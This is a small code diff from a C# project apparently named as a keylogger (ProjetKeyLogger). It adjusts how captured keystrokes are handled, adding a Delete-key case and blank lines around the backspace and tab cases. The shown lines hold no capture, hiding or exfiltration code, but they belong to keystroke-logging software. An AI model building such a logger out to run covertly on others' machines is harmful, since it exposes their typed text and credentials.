@@ -114,10 +114,15 @@ namespace ProjetKeyLogger
                                 }
                                break;
                             case 8:
+                            
                                 enregistrement.effacerContenu();
                                 break;
+
                             case 9:
                                 Console.Write(" ");
+                                break;
+
+                            case 46: //touche suppr : effacer contenu mais dans l'autre sens
                                 break;
 
                             case 48:
